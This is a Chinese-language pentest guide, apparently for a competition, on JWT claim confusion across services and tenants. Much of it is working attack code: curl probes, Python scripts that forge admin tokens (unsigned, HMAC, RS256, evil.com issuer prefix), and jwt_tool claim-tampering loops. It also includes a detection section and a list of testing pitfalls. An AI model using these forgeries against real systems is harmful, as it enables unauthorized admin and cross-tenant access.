# JWT claim 混淆：多受众、多租户下的信任边界错位

> 被 `competition-jwt-claim-confusion` 引用。这里的核心不是"能不能伪造签名"，而是
> **同一把钥匙开的门不一样**：token 被服务 A 合法签发，服务 B 却按自己的规则解读它。

## 一、先建"谁在解析这个 token"的地图

同一个 JWT 可能被 N 个服务消费，每个服务的校验强度不同：

| 服务 | 典型校验 | 常见缺失 |
| --- | --- | --- |
| 网关/API Gateway | 只验签，转发 claims 到 header | 不校验 `aud`；把 `sub` 塞进 `X-User-Id` |
| 核心 API | 验签 + 校验 `aud` | 只校验 `aud` 是字符串相等，不管 `azp` |
| 内部服务 | 只解 payload（信任网关） | **完全不验签**（内网假设） |
| 前端 BFF | 验签 + 读 `role` | 角色来自 token 而非 DB |
| 异步 worker | 从队列消息里读 claims | 不验签（信任队列） |
| 第三方集成 | 验签 + `iss` 前缀匹配 | `startsWith` 而非精确相等 |

**第一步动作**：把一个合法 token 拿去打所有已知服务，看哪些接受、返回什么错误。错误
文案（`invalid signature` / `audience mismatch` / `token expired`）直接暴露校验强度。

```bash
# 用同一个 token 打多个服务，观察错误差异
TOKEN=...
for host in api.example.com internal.example.com admin.example.com ws.example.com; do
  echo "=== $host"
  curl -s -o /dev/null -w '%{http_code}\n' "https://$host/api/v1/me" \
    -H "Authorization: Bearer $TOKEN"
  curl -s "https://$host/api/v1/me" -H "Authorization: Bearer $TOKEN" | head -c 300; echo
done
```

## 二、五种 claim 混淆（按危害排序）

### 2.1 跨受众复用（aud 缺失）

```bash
# App-A 的 token（aud=https://api-a.example.com）打 api-b
curl -s https://api-b.example.com/api/v1/me -H "Authorization: Bearer $TOKEN_A" | jq .
# 200 + 数据 → api-b 没校验 aud
```

**为什么可行**：多服务共用一套签名密钥（同一 IdP 的 JWKS）。签名有效 → 所有服务都信，
只有 `aud` 能区分"给谁的"。

**放大路径**：api-b 可能把 `sub` 当自己的用户 ID 用，而两个系统的 `sub` 空间不同 →
token 里的 sub=1001 在 api-b 里是另一个人。

```bash
# 验证 sub 空间错位：token 里 sub=1001，api-b 返回的是谁
python3 -c "import base64,json,sys;print(json.loads(base64.urlsafe_b64decode(sys.argv[1].split('.')[1]+'==')))" "$TOKEN_A"
curl -s https://api-b.example.com/api/v1/users/1001 -H "Authorization: Bearer $TOKEN_A" | jq '{id,email}'
```

### 2.2 多租户 claim 复用（tid / org / tenant）

```bash
# 改投递路径不改签名：token 里 tid=t-0001，请求打到租户 t-0002 的资源
curl -s https://api.example.com/api/v1/tenants/t-0002/users \
  -H "Authorization: Bearer $TOKEN_T1" | jq '.users[].email'
# 若返回 t-0002 的用户 → 服务端用路径里的租户，没用 token 里的 tid
```

**三种错位**：

| 错位 | 表现 |
| --- | --- |
| 只信路径 | `/tenants/{id}/...` 的 id 不校验与 token 的 tid 一致 |
| 只信 header | `X-Tenant-Id` 可覆盖 token 的 tid |
| 只信 token | 用户切换租户后 token 未刷新，仍能访问旧租户（这是反向的信息泄露） |

```bash
# 用 header 覆盖
curl -s https://api.example.com/api/v1/users \
  -H "Authorization: Bearer $TOKEN_T1" -H 'X-Tenant-Id: t-0002' | jq '.[].email'
```

### 2.3 sub / iss 校验缺失

```bash
# ① iss 前缀匹配：用 issuer = https://idp.example.com.evil.com 的自签 token
#    服务端用 startsWith("https://idp.example.com") 会通过
python3 - <<'PY'
import base64, json, hmac, hashlib
b=lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=').decode()
h=b({"alg":"HS256","typ":"JWT","kid":"default"})
p=b({"iss":"https://idp.example.com.evil.com","aud":"api.example.com","sub":"admin","role":"admin","exp":2000000000})
sig=base64.urlsafe_b64encode(hmac.new(b"KEY", (h+"."+p).encode(), hashlib.sha256).digest()).rstrip(b'=').decode()
print(h+"."+p+"."+sig)
PY

# ② iss 后缀匹配：https://evil.com/idp.example.com

# ③ 完全缺失 iss：删掉 iss 字段，若服务端不报错 → 没有校验

# ④ sub 是 email 时：sub=admin@example.com，服务端按 email 查库
```

**iss 匹配的坑**：`startsWith` / `endsWith` / `includes` 三种实现都见过。域名后面加
`.evil.com` 打前缀，用 `evil.com/idp.example.com` 打后缀。

### 2.4 角色 claim 的信任边界

```bash
# token 里 role=user，但某个服务的 admin 判断读的是别的字段
# 试全部可能的角色字段名
for f in role roles role_name user_role is_admin isAdmin admin scope scopes permissions groups; do
  echo "--- $f"
  # 用 jwt_tool 改单个 claim 并重放
  python3 jwt_tool.py "$TOKEN" -T -p "{\"$f\":\"admin\"}" -t https://api.example.com/api/v1/admin/users 2>/dev/null | tail -3
done
```

**关键判断**：服务端授权时读 token 里的 role，还是查 DB 的 role？

- 读 token → 改 role 就有权限（前提是能重签或遇到不验签的服务）
- 查 DB → 改 role 无效，但可以尝试 `sub` 改成已有 admin 用户

```bash
# 改 sub 为已知 admin 用户（若服务端按 sub 查 DB 且不校验 iss/aud）
python3 jwt_tool.py "$TOKEN" -T -p '{"sub":"U-ADMIN-001"}' \
  -t https://api.example.com/api/v1/me
```

### 2.5 `azp` 与多受众

`aud` 是数组时（`["api-a","api-b"]`），`azp` 表示实际授权的 client。有些实现只看
`aud` 包含自己就放行，不看 `azp`：

```bash
# aud 是数组，含 api-b；azp 是 app-a
# 用 app-a 的 token 打 api-b → 若放行，说明没校验 azp
```

## 三、构造最小可用 token（不需要爆破密钥）

目标：**在已知密钥/无签名校验的前提下，产出恰好够用的 token**。

```bash
# 情形 A：服务不验签（内网服务最常见）
python3 - <<'PY'
import base64, json
b=lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=').decode()
h=b({"alg":"HS256","typ":"JWT"})
p=b({"sub":"1001","role":"admin","tenant_id":"t-0002","iss":"https://idp.example.com","aud":"api.example.com","exp":2000000000,"iat":1700000000})
print(h+"."+p+".AAAA")   # 签名随便写
PY

# 情形 B：alg=none
# （见 jwt-oauth-testing.md）

# 情形 C：知道 HMAC 密钥（从 bundle / 配置 / 弱口令爆破拿到）
python3 - <<'PY'
import base64, json, hmac, hashlib
KEY=b"the-real-secret"
b=lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=').decode()
h=b({"alg":"HS256","typ":"JWT"})
p=b({"sub":"1001","role":"admin","exp":2000000000})
sig=base64.urlsafe_b64encode(hmac.new(KEY,(h+"."+p).encode(),hashlib.sha256).digest()).rstrip(b'=').decode()
print(h+"."+p+"."+sig)
PY

# 情形 D：有 IdP 私钥（测试环境）
# RS256 签名
python3 - <<'PY'
import base64, json, subprocess
b=lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=').decode()
h=b({"alg":"RS256","typ":"JWT","kid":"k1"})
p=b({"sub":"admin","role":"admin","aud":"api.example.com","iss":"https://idp.example.com","exp":2000000000})
open('/tmp/in','w').write(h+"."+p)
PY
openssl dgst -sha256 -sign idp_private.pem -out /tmp/sig /tmp/in
python3 -c "
import base64;print(open('/tmp/in').read()+'.'+base64.urlsafe_b64encode(open('/tmp/sig','rb').read()).rstrip(b'=').decode())"
```

**最小 token 的设计原则**：

1. 只带**必需的** claim——多余的 claim 会触发额外校验（如 `azp`、`scp`、`tid`）
2. `exp` 给足（避免中途过期打断测试）
3. 保留原始 `iss`/`aud`/`kid`（避免结构性拒绝）
4. `sub` 用目标用户的真实标识（从枚举/泄露里拿），别用 `admin` 这种可能不存在的

## 四、验伤：解析差异的证明

| 结论 | 证据 | 假象 |
| --- | --- | --- |
| aud 不校验 | api-b 返回**api-b 的数据**（非空、含 api-b 特有字段） | 200 但 body 是 `{}` 或 `{"error":...}` |
| tid 错位 | 路径租户 B + token 租户 A，返回 B 的用户 | 返回 B 的租户元信息（公开信息）但用户列表 403 |
| iss 绕过 | 自签 token 被接受 | 接受的其实是缓存里的旧会话 |
| role 来自 token | 改 role 后能调管理接口 | 接口 200 但返回"无权限"文案 |
| 不验签服务 | 签名随便写仍 200 | 该服务把 token 转发给验签服务后返回 401 |

**必须做交叉验证**：把同一 token 打两个服务，一个接受一个拒绝，才能证明"解析差异"存在。
只在一个服务上成功可能是那个服务本来就不需要认证。

```bash
# 交叉验证模板
for h in api-a api-b internal; do
  printf '%-10s ' "$h"
  curl -s -o /dev/null -w '%{http_code}\n' "https://$h.example.com/api/v1/me" \
    -H "Authorization: Bearer $TAMPERED_TOKEN"
done
# 期望：api-a 401, api-b 200 → 差异成立
```

## 五、检测视角

| 手法 | 日志 | 信号 |
| --- | --- | --- |
| 跨 aud 复用 | 各服务认证日志 | 同一 `jti` 出现在多个 `aud` 的服务上；`aud` ≠ 本服务标识但仍放行 |
| iss 前缀绕过 | 认证日志 | `iss` 不在精确白名单；`iss` 与本服务登记的 IdP 有子串关系 |
| 多租户错位 | 应用审计 | token 的 `tid` 与请求路径/header 的租户不一致 |
| 角色来自 token | 授权日志 | `role` 变更没有对应的 DB 变更记录 |
| 不验签服务 | 服务日志 | 签名验证模块未执行；`alg` 与历史基线不符 |
| 自签 token | 网关 | `kid` 不存在于 JWKS；签名验证失败率突增 |
| sub 枚举 | 应用 | 同一 token 访问连续/不连续的 `sub`（BOLA 模式） |

**必须落库的字段**：`jti`（如果存在）、`iss`、`aud`、`sub`、`kid`、`client_ip`、`user_agent`。
缺 `jti` 时用 `hash(header.payload)` 做伪唯一键——否则无法区分"同一 token 被重放"和
"两个用户恰好同期访问"。

## 六、常见坑

1. **改了 payload 忘了重签**——除非目标不验签。先确认验签行为（用乱签名打一下看错误码）。
2. **跨服务测试用了不同环境的 token**——staging 的 token 打 prod 必然失败，别当成"有校验"。
3. **aud 是数组时判断错**——`["api-a","api-b"]` 打 api-b 是**合法的**，不是漏洞。要看 api-b 是否应该被授权。
4. **iss 前缀绕过需要能控制域名**——`https://idp.example.com.evil.com` 需要你拥有 `evil.com` 并配好证书。纯黑盒不能测，只能看代码/配置。
5. **role 改完没清缓存**——很多服务把 claim 缓存在会话里，改 token 后要用新会话（换 IP/换 cookie）才生效。
6. **多租户测试只改路径**——还要试 header（`X-Tenant-Id`）、query（`?tenant=`）、body（`{"tenantId":...}`）三个位置。
7. **把"token 解析成功"当"身份已接受"**——必须走到一个读业务数据的接口。`/api/v1/me` 返回 200 但 body 是空对象时，可能是 sub 查不到用户却仍放行。